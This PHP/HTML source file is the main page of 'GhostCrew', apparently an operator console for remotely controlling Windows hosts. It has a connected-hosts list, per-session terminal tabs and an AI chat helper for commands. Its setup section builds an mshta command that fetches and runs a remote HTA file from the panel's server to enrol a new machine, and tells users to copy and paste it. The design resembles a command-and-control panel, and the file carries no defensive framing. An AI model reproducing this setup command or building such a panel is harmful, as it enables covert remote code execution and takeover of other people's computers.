<?php

/* index.php - Updated with chatbot integration */

require_once 'auth_config.php';
require_once 'config.php';

// Require authentication
requireAuth();

// Get current user
$user = getCurrentUser();
if (!$user) {
    header('Location: login.php');
    exit;
}

// Generate CSRF token
$csrfToken = generateCSRFToken();

// Get setup command with instance token
$instanceToken = getCurrentInstanceToken();
$setupCommand = "mshta \"" . APP_URL . "/local/autoconnect.hta?token=" . urlencode($instanceToken) . "\"";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostCrew - Secure Terminal</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome for icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
    <div class="container-fluid">
        <header>
            <h1>GhostCrew</h1>
            <div class="user-info">
                <div class="user-details">
                    <div class="user-name"><?php echo htmlspecialchars($user['full_name']); ?></div>
                    <div class="user-role"><?php echo htmlspecialchars($user['role']); ?></div>
                </div>
                <button class="logout-btn" onclick="logout()">
                    <i class="fas fa-sign-out-alt"></i>
                    Logout
                </button>
            </div>
        </header>
        
        <div class="main-content">
            <div class="sidebar">
                <h3>Connected Hosts</h3>
                <ul id="host-list">
                    <li class="no-hosts">No hosts connected</li>
                </ul>
                
                <div class="connection-setup">
                    <h3>Setup Instructions</h3>
                    <p>To connect a new host, run this command:</p>
                    <div class="setup-command">
                        <code id="setup-command-text"><?php echo htmlspecialchars($setupCommand); ?></code>
                        <button id="copy-command" title="Copy to clipboard"><i class="fas fa-copy"></i></button>
                    </div>
                    <p><small><strong>Note:</strong> Compatible with all Windows versions including older IE engines</small></p>
                </div>
                
                <div class="historical-sessions">
                    <h3>Historical Sessions</h3>
                    <ul id="historical-list">
                        <li class="no-hosts">No historical sessions</li>
                    </ul>
                </div>
            </div>
            
            <div class="terminal-chat-area">
                <div class="terminal-area">
                    <div class="tabs" id="session-tabs">
                        <div class="tab active" data-session="welcome">
                            <span class="tab-name">Welcome</span>
                        </div>
                    </div>
                    
                    <div class="terminal-chat-container">
                        <div class="terminal-section">
                            <div class="terminal-container">
                                <div class="terminal-session active" id="welcome-terminal">
                                    <div class="terminal-output">
                                        <div class="welcome-message">
                                            <p>Welcome to GhostCrew!</p>
                                            <p>Logged in as: <strong><?php echo htmlspecialchars($user['full_name']); ?></strong></p>
                                            <p>Connect a host using the setup command to begin.</p>
                                            <p>Your sessions are tracked and logged for security purposes.</p>
                                            <p>Use the AI assistant on the right for command help and suggestions.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="terminal-input-container">
                                <div class="prompt" id="terminal-prompt">$</div>
                                <input type="text" id="terminal-input" placeholder="Enter command..." disabled>
                                <button id="send-command" disabled>Send</button>
                            </div>
                        </div>
                        
                        <div class="chat-section">
                            <div class="chat-header">
                                <span>AI Command Assistant</span>
                            </div>
                            <div class="chat-messages" id="chat-messages">
                                <div class="chat-welcome">
                                    Hello! I'm your AI command assistant.<br>
                                    Ask me about Windows commands or request help with specific tasks!
                                </div>
                            </div>
                            <div class="chat-input-container">
                                <div class="chat-input-group">
                                    <textarea id="chat-input" placeholder="Ask me about commands..." rows="1"></textarea>
                                    <button id="send-chat">
                                        <i class="fas fa-paper-plane"></i>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Global variables
        const CSRF_TOKEN = '<?php echo $csrfToken; ?>';
        const USER_ID = <?php echo $user['id']; ?>;
        const USERNAME = '<?php echo htmlspecialchars($user['username']); ?>';
        const SESSION_TIMEOUT = <?php echo SESSION_TIMEOUT; ?>;
        
        // Logout function
        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                window.location.href = 'logout.php';
            }
        }
        
        // Enhanced copy command functionality
        $('#copy-command').click(function() {
            const command = $('#setup-command-text').text();
            navigator.clipboard.writeText(command).then(function() {
                const button = $('#copy-command');
                const originalContent = button.html();
                button.html('<i class="fas fa-check"></i>');
                button.css('background', 'var(--accent-green)');
                
                setTimeout(function() {
                    button.html(originalContent);
                    button.css('background', 'var(--accent-blue)');
                }, 2000);
            }).catch(function() {
                // Fallback for older browsers
                const textArea = document.createElement('textarea');
                textArea.value = command;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                
                const button = $('#copy-command');
                const originalContent = button.html();
                button.html('<i class="fas fa-check"></i>');
                button.css('background', 'var(--accent-green)');
                
                setTimeout(function() {
                    button.html(originalContent);
                    button.css('background', 'var(--accent-blue)');
                }, 2000);
            });
        });

        // Enhanced terminal input
        $('#terminal-input').on('keypress', function(e) {
            if (e.which === 13 && !$(this).prop('disabled')) {
                $('#send-command').click();
            }
        });

        // Chat input handling
        $('#chat-input').on('keypress', function(e) {
            if (e.which === 13 && !e.shiftKey) {
                e.preventDefault();
                $('#send-chat').click();
            }
        });

        // Auto-resize chat textarea
        $('#chat-input').on('input', function() {
            this.style.height = 'auto';
            this.style.height = Math.min(this.scrollHeight, 100) + 'px';
        });

        // Tab close functionality
        $(document).on('click', '.tab-close', function(e) {
            e.stopPropagation();
            const tab = $(this).closest('.tab');
            const sessionId = tab.data('session');
            
            if (sessionId !== 'welcome') {
                // End session on server
                if (!tab.hasClass('readonly')) {
                    endSession(sessionId);
                }
                
                tab.remove();
                $('#' + sessionId + '-terminal').remove();
                
                // Activate welcome tab if no other tabs
                if ($('.tab').length === 1) {
                    $('.tab[data-session="welcome"]').addClass('active');
                    $('#welcome-terminal').addClass('active');
                    updateTerminalPrompt();
                }
            }
        });

        // Function to end session
        function endSession(sessionId) {
            $.ajax({
                url: 'api.php',
                type: 'POST',
                data: {
                    action: 'end_session',
                    session_id: sessionId,
                    csrf_token: CSRF_TOKEN
                },
                dataType: 'json'
            });
        }

        // Function to update terminal prompt with working directory
        function updateTerminalPrompt(workingDir) {
            const promptElement = $('#terminal-prompt');
            if (workingDir && workingDir !== '') {
                // Format working directory to show like "C:\Users\test>"
                let formattedPrompt = workingDir;
                if (!formattedPrompt.endsWith('>')) {
                    formattedPrompt += '>';
                }
                promptElement.text(formattedPrompt);
            } else {
                promptElement.text();
            }
        }

        // Auto-scroll terminal output
        function scrollToBottom(element) {
            element.scrollTop = element.scrollHeight;
        }

        // Auto-scroll chat messages
        function scrollChatToBottom() {
            const chatMessages = document.getElementById('chat-messages');
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
    </script>
    <div class="clippy"></div>
    <!-- Enhanced terminal.js will be loaded -->
    <script src="assets/js/enhanced_terminal.js"></script>
</body>
</html>